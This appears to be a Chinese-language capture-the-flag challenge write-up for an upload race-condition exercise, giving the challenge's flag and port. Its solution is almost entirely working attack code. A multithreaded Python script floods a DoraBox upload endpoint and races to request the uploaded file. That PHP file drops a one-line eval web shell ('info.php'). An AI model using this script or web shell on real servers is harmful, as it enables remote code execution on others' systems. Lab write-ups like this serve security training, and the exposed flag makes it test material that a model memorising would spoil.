# 题目：条件竞争2

### 题目描述：条件竞争

### 题目难度： 🌟

### 维护：le31ei

### KEY: `flag{uplaod_OK}`

### 配置信息： 

1. 开放端口： `10003`

### 解题过程：

```python
# -*- coding:utf-8 -*-
import requests
import threading
import os

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.url = './key.php' #上传的文件地址
        self.uploadUrl = 'http://127.0.0.1/DoraBox/race_condition/upload.php' #上传文件的地址

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file info.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file...')
        file = {'myfile': open('key.php', 'r')} #本地脚本木马
        requests.post(self.uploadUrl, files=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()

if __name__ == '__main__':
    threads = 50    

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join() 

```

上传文件:

```php
<?php fputs(fopen("info.php", "w"), '<?php @eval($_POST["key"]);?>'); ?> 

```